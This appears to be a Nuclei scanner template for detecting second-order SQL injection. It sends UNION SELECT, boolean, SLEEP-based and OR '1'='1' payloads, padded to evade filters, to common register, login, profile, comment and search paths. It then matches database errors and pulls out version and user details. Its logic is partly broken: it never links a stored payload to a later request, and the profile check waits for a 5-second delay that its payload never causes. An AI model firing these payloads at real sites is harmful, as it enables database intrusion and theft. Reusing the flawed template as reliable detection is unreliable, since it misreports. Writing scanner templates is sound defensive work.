id: medium-webapp-sql-injection-second-order-stored

info:
  name: Second-Order SQL Injection - Elite Detection
  author: nuclei-community
  severity: critical
  description: |
    Detects second-order SQL injection vulnerabilities where malicious SQL payloads are stored
    and executed later in different contexts. Tests advanced blind and time-based techniques
    with sophisticated payload encoding and WAF bypass methods.
  reference:
    - https://owasp.org/www-community/attacks/SQL_Injection
    - https://portswigger.net/web-security/sql-injection/second-order
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 25
  tags: sqli,second-order,blind,time-based,elite

variables:
  sleep_time: "5"
  
http:
  - method: POST
    path:
      - "{{BaseURL}}/{{register_path}}"
    
    payloads:
      register_path:
        - "register.php"
        - "signup.php"
        - "create_account.php"
        - "user/register"
        - "auth/register"
        - "account/create"
        - "member/signup"
        - "registration.php"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      username=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--+-&password=test123&email=test@example.com&firstname=John&lastname=Doe

    matchers:
      - type: status
        status:
          - 200
          - 302

  - method: POST
    path:
      - "{{BaseURL}}/{{login_path}}"
    
    payloads:
      login_path:
        - "login.php"
        - "signin.php"
        - "auth.php"
        - "user/login"
        - "auth/login"
        - "account/login"
        - "member/signin"
        - "authentication.php"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      username=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--+-&password=test123

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "SQL.*error"
          - "MySQL.*error"
          - "PostgreSQL.*error"
          - "Oracle.*error"
          - "Microsoft.*ODBC"
          - "SQLite.*error"
          - "Unclosed quotation mark"
          - "quoted string not properly terminated"
          - "mysql_fetch"
          - "ORA-[0-9]{5}"
          - "Microsoft JET Database"
          - "Access Database Engine"

      - type: word
        part: body
        words:
          - "syntax error"
          - "unexpected token"
          - "unterminated string"
          - "invalid query"
          - "database error"
          - "sql error"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/{{profile_path}}"
    
    payloads:
      profile_path:
        - "profile.php"
        - "user_profile.php"
        - "account.php"
        - "user/profile"
        - "account/profile"
        - "member/profile"
        - "dashboard.php"
        - "settings.php"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      firstname=John'/**/AND/**/(SELECT/**/SUBSTRING(@@version,1,1))='5'/**/AND/**/'1'='1&lastname=Doe&email=test@example.com&bio=Test bio

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 200'
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/{{comment_path}}"
    
    payloads:
      comment_path:
        - "comment.php"
        - "add_comment.php"
        - "post_comment.php"
        - "comments/add"
        - "blog/comment"
        - "forum/post"
        - "feedback.php"
        - "review.php"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    body: |
      comment=Great post!'/**/UNION/**/SELECT/**/1,user(),database(),version(),5--+-&name=John&email=test@example.com

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "root@localhost"
          - "mysql@localhost"
          - "admin@localhost"
          - "[0-9]+\\.[0-9]+\\.[0-9]+"
          - "MySQL.*[0-9]+\\.[0-9]+"
          - "PostgreSQL.*[0-9]+\\.[0-9]+"
          - "Microsoft SQL Server"

      - type: word
        part: body
        words:
          - "information_schema"
          - "mysql"
          - "postgres"
          - "oracle"
          - "sqlite_master"
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/{{search_path}}?q=test'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables)>0--+-"
      - "{{BaseURL}}/{{search_path}}?query=test'/**/UNION/**/SELECT/**/1,2,3,4,5--+-"
      - "{{BaseURL}}/{{search_path}}?search=test'/**/AND/**/(SELECT/**/SLEEP({{sleep_time}}))--+-"
      - "{{BaseURL}}/{{search_path}}?keyword=test'/**/OR/**/'1'='1'--+-"

    payloads:
      search_path:
        - "search.php"
        - "find.php"
        - "lookup.php"
        - "query.php"
        - "search/results"
        - "find/results"
        - "products/search"
        - "blog/search"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 200'
        condition: and

      - type: regex
        part: body
        regex:
          - "SQL.*syntax.*error"
          - "mysql_num_rows"
          - "mysql_fetch_array"
          - "pg_query"
          - "sqlite_query"
          - "ORA-[0-9]{5}"
          - "Microsoft.*ODBC.*SQL"

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - 'MySQL.*([0-9]+\\.[0-9]+\\.[0-9]+)'
          - 'PostgreSQL.*([0-9]+\\.[0-9]+)'
          - 'root@([^\\s]+)'
        internal: true